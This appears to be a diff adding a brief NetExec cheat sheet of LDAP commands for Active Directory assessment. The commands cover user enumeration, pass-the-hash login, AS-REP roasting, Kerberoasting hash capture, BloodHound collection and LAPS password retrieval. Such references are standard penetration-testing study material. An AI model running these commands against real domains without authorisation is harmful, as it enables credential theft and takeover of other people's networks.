@@ -1,0 +1,23 @@
+# Netexec Cheat Sheet
+
+## Basic
+nxc ldap <IP> -u user -p pass
+
+## User Enumeration
+nxc ldap <IP> -u user -p pass --users
+
+## Credential Testing
+nxc ldap <IP> -u user -p pass
+nxc ldap <IP> -u user -H <hash>
+
+## ASREPRoast
+nxc ldap <IP> -u users.txt -p '' --asreproast out.txt
+
+## Kerberoast
+nxc ldap <IP> -u user -p pass --kerberoasting hash.txt
+
+## BloodHound
+nxc ldap <IP> -u user -p pass --bloodhound --collection All
+
+## LAPS
+nxc ldap <IP> -u user -p pass -M laps
